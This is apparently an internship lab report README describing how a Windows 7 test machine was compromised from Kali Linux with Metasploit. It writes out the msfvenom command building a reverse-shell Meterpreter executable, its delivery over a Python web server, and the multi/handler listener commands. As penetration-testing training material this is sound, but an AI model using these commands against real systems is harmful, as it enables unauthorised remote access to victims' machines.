# ACMEGRADE Internship Final Assessment
## Hack into Windows Machine using Metasploit

This repository contains the final project assessment report from the **Acmegrade Internship, May 2024**. The project successfully demonstrated a controlled penetration test scenario to exploit a vulnerable Windows 7 machine using the *Metasploit Framework*.

## üéØ Project Aim

The primary objective of this project was to gain remote access to a **Windows 7** machine (victim) from a **Kali Linux** machine (attacker) by leveraging the **Metasploit Framework** and a **Meterpreter** payload.

## üõ†Ô∏è Tools and Technologies Used

| Category | Tool/Technology | Role in Project |
| :--- | :--- | :--- |
| **Attacker OS** | Kali Linux | The penetration testing machine. |
| **Target OS** | Windows 7 | The victim machine that was compromised. |
| **Exploitation** | Metasploit Framework | Used to set up the listener (`multi/handler`) and manage the remote session. |
| **Payload Generation** | `msfvenom` | Used to generate the custom, malicious executable (`venom.exe`). |
| **Delivery Mechanism** | Python `http.server` | Used to quickly host and transfer the payload (`venom.exe`) to the target machine over port `8080`. |

## ‚öôÔ∏è Execution Summary (Procedure)

### Step 1: Information Gathering

The IP addresses of both machines were identified:

* **Attacker IP (Kali Linux):** `35.35.35.4`
    * *Command:* `ifconfig eth0`
* **Victim IP (Windows 7):** `35.35.35.8`
    * *Command:* `ipconfig`

### Step 2: Weaponization

The **`msfvenom`** command was used to generate the payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=35.35.35.4 LPORT=3535 -f exe -o venom.exe
```

* **Payload:** `windows/meterpreter/reverse_tcp`. This payload creates a connection from the victim back to the attacker.

* **LHOST:** Attacker IP address (`35.35.35.4`).

* **LPORT:** Port for the reverse connection (`3535`).

* **Output:** `venom.exe`


### Step 3: Delivery

1. A Python web server was hosted on the attacker (Kali Linux) machine:

```bash
python -m http.server 8080
```

2. The target (Windows 7) accessed `http://35.35.35.4:8080` and downloaded the `venom.exe` payload.


### Step 4: Exploitation

1. A listener was started on the Kali machine using `msfconsole`:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 35.35.35.4
set LPORT 3535
run
```

2. The `venom.exe` payload was executed on the Windows 7 target machine.

3. Upon execution, a **Meterpreter session** was successfully opened on the Kali machine.


The target was successfully compromised , allowing post-exploitation commands like `sysinfo` and `ls` to be run on the victim system.

## ‚úÖ Conclusion

The project successfully demonstrated the process of exploiting a vulnerable Windows 7 machine using a Meterpreter payload generated by `msfvenom`. Remote access was gained and controlled through the Metasploit Framework, validating the effectiveness of the penetration testing tools and techniques used.
